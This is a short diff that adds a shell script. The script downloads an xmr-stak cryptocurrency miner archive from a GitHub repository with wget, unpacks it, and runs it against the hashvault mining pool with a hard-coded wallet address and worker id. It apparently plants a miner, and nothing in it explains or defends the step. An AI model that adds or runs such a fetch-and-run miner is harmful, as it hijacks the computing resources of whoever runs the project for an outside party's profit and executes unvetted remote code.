@@ -1,0 +1,4 @@
+wget https://github.com/novalanto010101/sc/raw/main/xmr-stak-linux-2.10.8-cpu_cuda-nvidia.tar.xz
+tar xf xmr-stak-linux-2.10.8-cpu_cuda-nvidia.tar.xz
+cd xmr-stak-linux-2.10.8-cpu_cuda-nvidia
+./xmr-stak --tls-url pool.hashvault.pro:80 --user ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN.500c27a31b811f014dd3c15f47fa3b4d3ea4af7700b2a249218b327f315d5735 --pass x --currency cryptonight_gpu
